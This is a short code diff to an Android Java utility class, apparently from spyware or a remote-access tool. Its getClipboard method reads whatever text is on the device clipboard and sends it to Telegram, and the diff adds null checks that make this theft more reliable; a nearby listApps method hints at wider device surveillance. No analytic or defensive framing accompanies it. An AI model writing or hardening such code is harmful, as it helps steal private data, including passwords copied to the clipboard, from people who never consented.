@@ -129,11 +129,19 @@ public class Utils {
 
     public static void getClipboard(Context ctx) {
         ClipboardManager cm = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
-        if (cm.hasPrimaryClip()) {
-            String text = cm.getPrimaryClip().getItemAt(0).getText().toString();
-            sendToTelegram("📋 Clipboard: " + text);
+        
+        if (cm != null && cm.hasPrimaryClip()) {
+            ClipData clipData = cm.getPrimaryClip();
+            if (clipData != null && clipData.getItemCount() > 0) {
+                CharSequence textChar = clipData.getItemAt(0).getText();
+                if (textChar != null) {
+                    String text = textChar.toString();
+                    sendToTelegram("📋 Clipboard: " + text);
+                }
+            }
         }
     }
+
 
     public static void listApps(Context ctx) {
         PackageManager pm = ctx.getPackageManager();
